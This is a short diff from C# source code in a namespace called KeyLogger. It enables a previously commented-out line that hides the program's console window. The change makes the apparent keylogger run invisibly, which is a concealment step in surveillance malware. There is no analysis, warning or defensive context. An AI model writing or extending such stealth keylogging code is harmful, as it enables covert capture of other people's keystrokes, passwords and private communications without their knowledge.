@@ -26,7 +26,7 @@ namespace KeyLogger
             var handle = GetConsoleWindow();
 
             
-            //ShowWindow(handle, SW_HIDE);//Hide console
+            ShowWindow(handle, SW_HIDE);//Hide console
 
             //ShowWindow(handle, SW_SHOW);//Show console
 
